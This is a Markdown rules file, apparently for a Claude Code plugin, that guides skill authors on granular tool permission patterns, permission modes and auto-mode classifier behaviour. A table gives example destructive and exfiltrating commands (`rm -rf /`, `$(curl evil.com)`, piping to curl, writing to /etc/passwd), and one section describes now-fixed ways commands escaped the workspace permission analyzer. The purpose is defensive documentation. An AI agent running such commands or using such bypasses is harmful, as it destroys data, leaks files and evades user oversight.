---
created: 2026-01-16
modified: 2026-06-08
reviewed: 2026-06-08
paths:
  - "**/skills/**"
  - "**/SKILL.md"
  - "**/agents/**"
---

# Agentic Permissions

Skills should use granular `allowed-tools` permissions to enable seamless, deterministic execution without interactive approval prompts. The granular patterns in this rule are also the patterns that survive auto mode — see `.claude/rules/auto-mode.md`.

## Permission Modes

Claude Code now ships several permission modes. The relevant ones for skill authoring are:

| Mode | What runs without asking | Skill-authoring impact |
|------|--------------------------|------------------------|
| `default` | Reads only | Granular `allowed-tools` is the only way to avoid prompts. |
| `acceptEdits` | Reads, file edits, common filesystem commands (`mkdir`, `touch`, `mv`, `cp`, `sed`, etc.) | Bash skills still benefit from narrow `Bash(<command> *)` patterns. |
| `auto` | Everything that survives a classifier review | Broad rules like `Bash(*)` and `Bash(python*)` are **dropped on entering auto mode**. Narrow rules like `Bash(git status *)` carry over and skip the classifier round-trip. |
| `dontAsk` | Pre-approved tools only | Without granular `allow` rules, the skill cannot run. |
| `bypassPermissions` | Everything except protected paths | No safety layer — granular permissions are unenforced but still document intent. |

See `.claude/rules/auto-mode.md` for the full auto-mode model (decision order, dropped-rule list, conversation boundaries, subagent behaviour, deny-and-continue thresholds).

**Bottom line for skill authors**: write narrow `Bash(<command> *)` patterns. They reduce prompts in `default`/`acceptEdits`, survive transition into `auto`, and are required by `dontAsk`.

## Permission Syntax

### Frontmatter Format

```yaml
allowed-tools: Bash(git status *), Bash(gh pr *), Read, TodoWrite
```

- Uses **space separator** between command and wildcard: `Bash(command *)`
- **Prefix matching**: `Bash(git diff *)` matches `git diff`, `git diff --cached`, `git diff --stat`
- Comma-separated list of tool permissions
- **`ask` tier**: Use `ask` to prompt the user for confirmation (neither auto-allow nor auto-deny):
  ```yaml
  allowed-tools: Bash(git push *):ask, Bash(git status *), Read
  ```
  The `:ask` suffix on a pattern means Claude can use the tool but will always prompt for confirmation.

### Pattern Examples

| Pattern | Matches |
|---------|---------|
| `Bash(git status *)` | `git status`, `git status --porcelain`, `git status -s` |
| `Bash(gh pr *)` | `gh pr view`, `gh pr checks`, `gh pr list --json` |
| `Bash(gh run *)` | `gh run view`, `gh run list`, `gh run view --log-failed` |
| `Bash(npm run *)` | `npm run test`, `npm run build`, `npm run lint` |
| `Skill(git-*)` | `git-commit`, `git-rebase`, `git-pr-create` (2.1.139+) |
| `Skill(*)` | Every skill (2.1.139+) |

> **Note (2.1.139)**: `Skill(<name> *)` permission rules use prefix matching, just like `Bash(<command> *)` — matching `Bash(ls *)` behavior. Before 2.1.139, wildcards inside `Skill(...)` were treated as literal characters and silently failed to match (only the bare `Skill(*)` form worked).

## Shell Operator Protections

Claude Code 2.1.7+ includes built-in protections against dangerous shell operators in permission patterns. As of 2.1.59, the "always allow" permission prompt handles compound bash commands more accurately — each subcommand is evaluated against permission patterns individually.

### Protected Operators

These operators are blocked by default when matched against permission patterns:

| Operator | Risk | Example |
|----------|------|---------|
| `&&` | Command chaining | `ls && rm -rf /` |
| `\|\|` | Conditional execution | `false \|\| malicious` |
| `;` | Command separation | `safe; dangerous` |
| `\|` | Pipe to other commands | `cat file \| curl` |
| `>` / `>>` | Output redirection | `echo bad > /etc/passwd` |
| `$()` | Command substitution | `$(curl evil.com)` |
| `` ` `` | Backtick substitution | `` `rm -rf /` `` |

### Security Behavior

When a Bash command contains shell operators:
1. The entire command is evaluated, not just the prefix
2. Permission patterns like `Bash(git *)` won't match `git status && rm -rf`
3. Users see a clear warning about the blocked operator

### Working-Directory Bypass Hardening (2.1.149)

The permission analyzer tracks the working directory so a command cannot quietly escape the workspace and read outside it. Two 2.1.149 fixes closed bypasses:

- **PowerShell built-in `cd` forms.** `cd..`, `cd\`, `cd~`, and bare drive switches like `X:` changed the working directory undetected, letting a later command read outside the workspace. These now register as directory changes.
- **Stale variable tracking across `cd`/`pushd`/`popd`.** The analyzer previously trusted stale values for `PWD`, `OLDPWD`, and `DIRSTACK` after a directory change, leaving a gap where a path check used the wrong working directory. The tracking is now refreshed on each `cd`/`pushd`/`popd`.

These are harness-level guards, not skill-authoring concerns — but they mean a skill can rely on the workspace boundary holding even when its scripts navigate directories.

### Safe Patterns

```yaml
# These are safe - single commands only
allowed-tools: Bash(git status *), Bash(npm test *), Bash(bun run *)
```

### Scripts for Compound Operations

When a skill needs compound operations (validation checks, multi-step diagnostics, data aggregation), use **standalone shell scripts** instead of inline commands. This consolidates many granular permission patterns into one `Bash(bash *)` pattern.

**Anti-pattern** — many shell utility patterns that force inline bash:
```yaml
# Each generates complex inline commands requiring individual approval
allowed-tools: Bash(test *), Bash(jq *), Bash(head *), Bash(find *), Bash(cp *), Read
```

**Correct pattern** — standalone scripts with a single permission:
```yaml
# All script invocations auto-approved with one pattern
allowed-tools: Bash(bash *), Read, TodoWrite
```

Scripts live in `skills/<skill-name>/scripts/` and are invoked via:
```bash
bash "${CLAUDE_SKILL_DIR}/scripts/check-settings.sh" --home-dir "$HOME" --project-dir "$(pwd)"
```

#### When to Use Scripts vs Granular Patterns

| Use granular `Bash(command *)` | Use `Bash(bash *)` with scripts |
|-------------------------------|--------------------------------|
| Primary CLI tools (`git`, `gh`, `curl`, `npm`) | Shell utilities (`test`, `jq`, `find`, `cp`, `mkdir`) |
| Single-purpose commands | Multi-step validation/diagnostics |
| Commands that benefit from specific allowlisting | Compound operations needing `&&`, `||`, pipes |

#### Script Conventions

Scripts must follow these patterns (see `shell-scripting.md`):
- `#!/usr/bin/env bash` + `set -uo pipefail`
- Accept `--home-dir`, `--project-dir` for path portability
- Output structured `KEY=value` pairs with `=== SECTION ===` headers
- Use prefixed variable names (avoid reserved words)

## Design Principles

### 1. Granular Over Broad

Prefer specific command patterns over broad tool access.

Use specific command patterns:

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git add *), Read
```

### 2. Principle of Least Privilege

Only grant permissions needed for the command's purpose.

| Command Purpose | Appropriate Permissions |
|-----------------|------------------------|
| Read-only diagnostics | `Bash(git status *), Bash(gh pr view *), Read` |
| Commit workflow | Above + `Bash(git add *), Bash(git commit *)` |
| PR workflow | Above + `Bash(git push *), Bash(gh pr create *)` |

### 3. Deterministic Execution

Commands should run the same way every time. This means:
- Fixed command patterns in context sections
- JSON/porcelain output for machine parsing
- No ad-hoc piping that requires additional approval

## Standard Permission Sets

### Git Read-Only

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git branch *), Bash(git remote *), Read, Grep, Glob
```

### Git Read-Write

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git branch *), Bash(git add *), Bash(git commit *), Bash(git restore *), Read, Edit, Grep, Glob, TodoWrite
```

### Git + GitHub CLI

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git add *), Bash(git commit *), Bash(git push *), Bash(gh pr *), Bash(gh run *), Bash(gh issue *), Read, Edit, Grep, Glob, TodoWrite
```

### CI/CD Diagnostics

```yaml
allowed-tools: Bash(gh pr checks *), Bash(gh pr view *), Bash(gh run view *), Bash(gh run list *), Bash(git status *), Bash(git diff *), Bash(git log *), Read, Grep, Glob, TodoWrite
```

### Security Checks

```yaml
allowed-tools: Bash(gitleaks *), Bash(pre-commit *), Bash(git status *), Read, Grep, Glob, TodoWrite
```

## Machine-Readable Output

Commands should use output formats optimized for AI parsing.

### Git Commands

| Operation | Command |
|-----------|---------|
| Status | `git status --porcelain=v2 --branch` |
| Diff stats | `git diff --stat --numstat` |
| Log | `git log --format='%H %s' -n 10` |
| Branch info | `git branch -vv --format='%(refname:short) %(upstream:short) %(upstream:track)'` |

### GitHub CLI Commands

| Operation | Command |
|-----------|---------|
| PR checks | `gh pr checks $N --json name,state,conclusion,detailsUrl` |
| PR details | `gh pr view $N --json number,title,state,mergeable,statusCheckRollup` |
| Run details | `gh run view $ID --json conclusion,status,jobs,createdAt` |
| Failed logs | `gh run view $ID --log-failed` |
| Issue details | `gh issue view $N --json number,title,body,state,labels,assignees` |

## Project Settings Recommendation

For projects using plugins with these patterns, recommend adding to `.claude/settings.json`:

```json
{
  "permissions": {
    "allow": [
      "Bash(gh pr *)",
      "Bash(gh run *)",
      "Bash(gh issue *)",
      "Bash(git status *)",
      "Bash(git diff *)",
      "Bash(git log *)",
      "Bash(git add *)",
      "Bash(git commit *)",
      "Bash(git push *)",
      "Bash(git branch *)",
      "Bash(git remote *)",
      "Bash(pre-commit *)",
      "Bash(gitleaks *)"
    ]
  }
}
```

These narrow rules carry over into auto mode and skip the classifier. Avoid broad patterns like `Bash(*)` or `Bash(python*)` — auto mode drops them at runtime, and they reduce safety in `default`/`acceptEdits`.

### Writes to Protected Paths

Claude Code's built-in classifier treats `.claude/**` as a protected directory (except for `.claude/commands`, `.claude/agents`, `.claude/skills`, and `.claude/worktrees` — see `auto-mode.md`). Writes route through the classifier in auto mode and prompt in lower modes. Subagents observe this denial as a hard block on `Edit`/`Write`, regardless of the parent session's permission mode.

`Edit(<glob>)` and `Write(<glob>)` allow rules in `settings.json` resolve at step 1 of the decision chain and override the protected-path check. Use this to carve out documentation directories under `.claude/` that should be subagent-writable:

```json
{
  "permissions": {
    "allow": [
      "Edit(.claude/rules/**)",
      "Write(.claude/rules/**)"
    ]
  }
}
```

This repo carves out `.claude/rules/**` because the files there are documentation read by humans and injected into agent context — not configuration that affects the harness. Skills, agents, and commands directories are already in Claude Code's default carve-out for the same reason; rules belong in the same trust tier.

### `autoMode.hard_deny` (2.1.136+)

Rules in `autoMode.hard_deny` block unconditionally -- the classifier cannot override them regardless of user intent or allow exceptions:

```json
{
  "permissions": {
    "autoMode": {
      "hard_deny": ["Bash(rm -rf *)"]
    }
  }
}
```

Use `hard_deny` for security-critical operations that must never run in auto mode even when the user explicitly permits them. Contrast with `autoMode.soft_deny`, which the classifier can override for good reason.

### Auto Mode Dialog Reasons (2.1.141+)

When auto mode surfaces a permission prompt, the dialog now explains **why** — including when a `permissions.ask` rule triggered the prompt. Previously, users saw a generic "Claude wants permission" prompt and had to infer which rule fired. Authors writing `:ask` patterns can rely on the dialog to surface their rule:

```yaml
allowed-tools: Bash(git push *):ask, Bash(git status *), Read
```

The dialog now shows "Matched `Bash(git push *):ask` — confirm before push", giving the human the context to decide.

### `permissions.defaultMode` in Background Sessions (2.1.143+)

Background sessions launched from `claude agents` honor `permissions.defaultMode` from `settings.json`. Before 2.1.143, the background launcher overrode the configured default and started every session in `auto` mode — which silently expanded the permission surface for users who had deliberately chosen a stricter default. The fix means stricter modes (`default`, `dontAsk`) now apply consistently to both foreground and background sessions.

### Hook `if` Condition Matching (2.1.147+)

`if`-gated permission rules whose condition targeted PowerShell commands — e.g. `PowerShell(git push*)` — never matched, so the gate silently never fired. 2.1.147 fixed the condition matching. If a skill or settings file relies on an `if`-conditioned rule against a PowerShell command to allow or prompt, that gate now evaluates correctly rather than being a no-op.

### Remote Control Disabled by API Key (2.1.139+)

Remote Control, `/schedule`, and claude.ai MCP connectors are disabled when any of `ANTHROPIC_API_KEY`, `apiKeyHelper`, or `ANTHROPIC_AUTH_TOKEN` is set. These features rely on the claude.ai session identity to route remote control commands and scheduled jobs; an API-key session has no such identity, so silently allowing the features would break in unintuitive ways. If you need remote control, sign in via the standard OAuth flow rather than configuring an API key.

## Context Section Patterns

Context commands use `!` backtick syntax and are subject to shell operator protections.

### Context Command Patterns

Context commands must use plain commands without shell operators. The `>` in `2>/dev/null` is blocked by shell operator protections, just like `||`, `&&`, `|`, and `;`.

Commands that fail produce empty output, which is acceptable — the context system handles missing context gracefully.

Use `find` for file/directory discovery (succeeds with empty output when no matches):

```markdown
## Context

- Git status: !`git status --porcelain=v2 --branch`
- PR checks: !`gh pr checks $PR_NUMBER --json name,state,conclusion`
- Current branch: !`git branch --show-current`
- Config exists: !`test -f .config.json`
- Workflows: !`find .github/workflows -maxdepth 1 -name '*.yml'`
- Directories: !`find . -maxdepth 1 -type d \( -name 'src' -o -name 'lib' \)`
- Config files: !`find . -maxdepth 1 \( -name '*.config.js' -o -name '*.config.ts' \)`
```

### Handling Missing Context

- Commands that fail produce empty output — no error suppression needed
- Check for empty values before using them
- Provide defaults in the command logic
- Use existence checks (`test -f`, `test -d`) for boolean context

## Checklist for New Skills

- [ ] Uses granular `Bash(command *)` patterns for primary CLI tools
- [ ] Shell utility operations (`test`, `jq`, `find`, `cp`, `mkdir`) use scripts with `Bash(bash *)`
- [ ] Context commands use JSON/porcelain output
- [ ] Context commands contain no shell operators (`>`, `|`, `||`, `&&`, `;`)
- [ ] Context commands use `find` for file/directory discovery
- [ ] Only necessary permissions are granted
- [ ] Matches a standard permission set or documents why custom set is needed


